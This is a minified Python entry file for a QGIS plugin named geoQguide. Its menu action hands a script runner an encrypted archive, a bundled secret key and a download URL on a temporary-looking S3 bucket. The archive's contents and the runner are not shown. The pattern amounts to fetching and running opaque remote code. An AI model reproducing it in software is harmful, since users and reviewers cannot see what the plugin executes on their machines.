import os
from.settings_manager import SettingsManager
_HERE=os.path.dirname(os.path.abspath(__file__))
class GeoQguidePlugin:
	def __init__(A,iface):A.iface=iface;A._action=None;A._runner=None;A.settings=SettingsManager();A.settings.write_defaults()
	def initGui(A):from qgis.PyQt.QtWidgets import QAction as B;A._action=B('geoQguide',A.iface.mainWindow());A._action.triggered.connect(A.run);A.iface.addPluginToMenu('geoQguide',A._action)
	def unload(A):A.iface.removePluginMenu('geoQguide',A._action);A._action=None;A._runner=None
	def _get_runner(A):
		if A._runner is None:from.runner import ScriptRunner as B;from.secret_key import BUNDLE_KEY as C;A._runner=B(bundle_path=os.path.join(_HERE,'bundle.tar.gz.enc'),bundle_key=C,bundle_url='https://geoqguide-temp-501396320318-eu-central-1-an.s3.eu-central-1.amazonaws.com/bundle.tar.gz.enc')
		return A._runner
	def run(A):from.launcher_dialog import launch as B;B(runner=A._get_runner(),settings_manager=A.settings)